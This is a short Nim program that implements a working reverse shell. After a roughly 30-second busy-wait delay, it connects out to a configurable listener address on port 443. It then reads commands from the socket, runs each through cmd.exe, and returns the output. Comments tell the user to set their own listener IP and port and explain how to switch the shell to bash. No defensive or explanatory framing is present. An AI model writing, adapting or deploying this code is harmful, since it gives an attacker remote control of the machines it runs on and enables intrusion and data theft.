import net, osproc, strformat, times

let now1 = now() + 30.seconds # <-- Modify the amount of sleep time if desired
var i = 1

while now() <= now1:
  var i = i + 1

let
  ip = "192.168.1.79" # <-- Change this to your listener's IP
  port = 443          # <-- Change this to your listener's PORT
  sock = newSocket()

sock.connect(ip, Port(port))

let prompt = "Nim-Shell> "
while true:
  send(sock, prompt)
  let bad = recvLine(sock)
  let cmd = execProcess(fmt"cmd.exe /C " & bad) # <-- Can work on Linux/Unix if changed to bash command
  send(sock, cmd)
